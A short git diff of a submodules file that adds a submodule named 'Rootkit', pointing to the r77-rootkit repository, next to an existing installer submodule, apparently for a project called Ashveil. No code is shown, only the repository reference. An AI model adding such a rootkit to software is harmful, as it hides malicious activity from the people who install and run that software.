@@ -4,3 +4,6 @@
 [submodule "Installer"]
 	path = Installer
 	url = https://github.com/madmaxvoltro/Ashveil_installer.git
+[submodule "Rootkit"]
+	path = Rootkit
+	url = https://github.com/bytecode77/r77-rootkit.git
